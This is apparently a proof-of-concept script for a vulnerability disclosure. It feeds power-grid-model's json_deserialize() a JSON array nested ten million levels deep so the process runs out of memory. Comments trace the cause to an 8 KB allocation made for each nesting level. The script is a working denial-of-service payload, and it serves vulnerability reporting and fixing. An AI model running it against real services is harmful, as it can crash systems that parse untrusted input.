import sys

try:
    from power_grid_model.utils import json_deserialize
except ImportError:
    sys.exit("power-grid-model is not installed.  pip install power-grid-model")

DEPTH = int(sys.argv[1]) if len(sys.argv) > 1 else 10_000_000

payload = (b"[" * DEPTH) + b"0" + (b"]" * DEPTH)
print(f"[i] depth={DEPTH:,}  payload={len(payload) / 1e3:.0f} KB")
print("[i] calling json_deserialize() — process should be OOM-killed")
sys.stdout.flush()

json_deserialize(payload)

# Each [ calls start_array, which causes sbuffer's constructor being called and to malloc() 8KB of data. 
#   1. Each [ (or {) pushes onto the stack — start_array() / start_object():
#   // line 142-145
#   bool start_array(size_t /* elements */) {
#       data_buffers.emplace();   // <-- default-constructs a JsonMapArrayData in place
#       return true;
#   }
#   // line 121-124 (same thing for objects)
#   bool start_object(size_t) { data_buffers.emplace(); return true; }

#   2. The stack's element type (line 167):
#   std::stack<JsonMapArrayData> data_buffers;
#   emplace() with no args -> default-constructs a JsonMapArrayData.

#   3. JsonMapArrayData has an sbuffer member and a defaulted constructor (lines 69-73):
#   struct JsonMapArrayData {
#       size_t size{};
#       msgpack::sbuffer buffer;        // <-- this member
#       JsonMapArrayData() = default;   // <-- defaulted ctor default-constructs
#   `buffer`
#       ...
#   };

#   So data_buffers.emplace() -> JsonMapArrayData() (defaulted) -> default-constructs its
#   buffer member -> calls msgpack::sbuffer::sbuffer(), which is where the 8 KB malloc
#   happens (in msgpack/v1/sbuffer.hpp):
#   // sbuffer.hpp:28
#   sbuffer(size_t initsz = MSGPACK_SBUFFER_INIT_SIZE) : m_size(0), m_alloc(initsz) {
#       if (initsz == 0) { m_data = MSGPACK_NULLPTR; }
#       else { m_data = (char*)::malloc(initsz); ... }   // <-- 8192-byte malloc, line
#   33
#   }